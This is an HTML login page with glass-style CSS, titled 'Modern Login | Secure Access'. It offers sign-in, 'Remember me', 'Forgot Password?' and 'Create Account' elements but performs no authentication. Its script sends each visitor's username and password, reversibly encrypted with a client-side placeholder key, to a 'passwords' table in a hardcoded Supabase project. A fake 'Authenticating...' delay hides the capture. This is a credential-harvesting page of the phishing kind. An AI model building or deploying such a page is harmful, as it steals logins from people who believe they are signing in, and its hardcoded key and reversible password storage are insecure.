<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Login | Secure Access</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            /* Animated Gradient Background */
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            overflow: hidden;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .login-container {
            position: relative;
            width: 400px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.15); /* Transparency */
            backdrop-filter: blur(15px); /* The "Glass" effect */
            -webkit-backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
            color: white;
        }

        h2 {
            text-align: center;
            margin-bottom: 30px;
            font-weight: 600;
            letter-spacing: 1px;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            font-weight: 300;
        }

        .input-group input {
            width: 100%;
            padding: 12px 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            outline: none;
            color: white;
            transition: 0.3s;
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .input-group input:focus {
            background: rgba(255, 255, 255, 0.2);
            border-color: #fff;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 8px;
            background: #fff;
            color: #333;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s ease;
        }

        .login-btn:hover {
            background: #23a6d5;
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .options {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            font-size: 0.8rem;
        }

        .options a {
            color: white;
            text-decoration: none;
            opacity: 0.8;
        }

        .options a:hover {
            opacity: 1;
            text-decoration: underline;
        }

        footer {
            margin-top: 30px;
            text-align: center;
            font-size: 0.85rem;
            opacity: 0.7;
        }

        footer a {
            color: white;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login</h2>
        <form id="loginForm">
            <div class="input-group">
                <label>Email Address/ Username</label>
                <input type="text" id="user" placeholder="e.g. samwel@example.com" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="pass" placeholder="••••••••" required>
            </div>

            <button onclick="saveToCloud()" type="submit" class="login-btn">Sign In</button>

            <div class="options">
                <label><input type="checkbox"> Remember me</label>
                <a href="#">Forgot Password?</a>
            </div>
        </form>

        <footer>
            Don't have an account? <a href="#">Create Account</a>
        </footer>
    </div>

    <script>
        const SUPABASE_URL = 'https://fjbldtippwrdxynfwidx.supabase.co'; 
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZqYmxkdGlwcHdyZHh5bmZ3aWR4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzIwNTMyMzIsImV4cCI6MjA4NzYyOTIzMn0.7EQHHbYGSPH1mI6kh-XuyMVWxaPrQ4qw7PIBcy-j8I0';
        const MASTER = 'YOUR_CHOSEN_MASTER_KEY';
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        async function saveToCloud() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            // Encrypt before it leaves your computer
            const encrypted = CryptoJS.AES.encrypt(pass, MASTER).toString();

            const { error } = await supabaseClient.from('passwords').insert([
                { username: user, password: encrypted }
            ]);

            if (error) alert("Error: " + error.message);
            else alert("Saved to Cloud!");
        }

        // Simple interaction handling
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.querySelector('.login-btn');
            btn.innerHTML = "Authenticating...";
            btn.style.opacity = "0.7";
            
            // Simulating a delay
            setTimeout(() => {
                btn.innerHTML = "Sign In";
                btn.style.opacity = "1";
            }, 1500);
        });
    </script>
</body>
</html>
